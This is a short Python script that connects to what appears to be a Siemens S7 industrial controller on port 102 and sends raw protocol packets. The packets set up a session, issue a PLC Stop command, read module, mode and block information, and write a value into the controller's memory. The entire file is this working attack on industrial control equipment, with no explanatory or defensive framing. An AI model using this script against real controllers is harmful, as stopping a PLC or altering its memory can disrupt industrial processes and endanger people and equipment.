import sys
import socket
from scapy.all import *
from scapy.layers.inet import IP, TCP

target = "192.168.93.80"
port = 102


def create_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    return s


s = create_sock()


def send(s, pkt):
    s.send(pkt)
    time.sleep(0.2)
    s.recv(1024)


# Connection Request (0x0e)
cotp_conreq_pkt = bytes.fromhex(
    "03000016" + "11 e0 0000 0001 00 c0 01 0a c1 02 0100 c2 02 0301"
)
send(s, cotp_conreq_pkt)

# # TPKT, COTP DT Data (0x0f) and S7 Job - Setup Communication (0xf0)
s7_setup_comm = bytes.fromhex(
    "03000019" + "02f080" + "32 01 0000 ffff 0008 0000 f0 00 0003 0003 03c0"
)
send(s, s7_setup_comm)

# Job - PLC Stop (0x29)
s7_plc_stop = bytes.fromhex(
    "03000021"
    + "02f080"
    + "32 01 0000 0000 0010 0000 29 0000 0000 0009 505f50524f4752414d"
)
send(s, s7_plc_stop)

s7_read_szl = bytes.fromhex(
    "03000021"
    + "02f080"
    + "32 07 0000 0100 0008 0008 00 01 12 04 11 44 01 00 ff 09 0004 0011 0000"
)  # Module identification
send(s, s7_read_szl)

s7_read_szl = bytes.fromhex(
    "03000021"
    + "02f080"
    + "32 07 0000 0200 0008 0008 00 01 12 04 11 44 01 00 ff 09 0004 0424 0000"
)  # Modes
send(s, s7_read_szl)

s7_read_szl = bytes.fromhex(
    "0300001d"
    + "02f080"
    + "32 07 0000 0700 0008 0004 00 01 12 04 11 43 01 00 0a 00 00 00"
)  # List blocks
send(s, s7_read_szl)

s7_init_ssl = bytes.fromhex(
    "03000021"
    + "02f080"
    + "72 01 0012 31 0000 05b3 0000 0001 00000000 30 00000000 72 01 0000"
)
send(s, s7_init_ssl)

s7_write_M00 = bytes.fromhex(
    "03000024"
    + "02f080"
    + "32 01 0000 0000 000e 0005 05 01 12 0a 10 01 0001 0001 83 000009 00 03 0001 00"
)  # Last byte is the value that we need to write
send(s, s7_write_M00)

s.close()
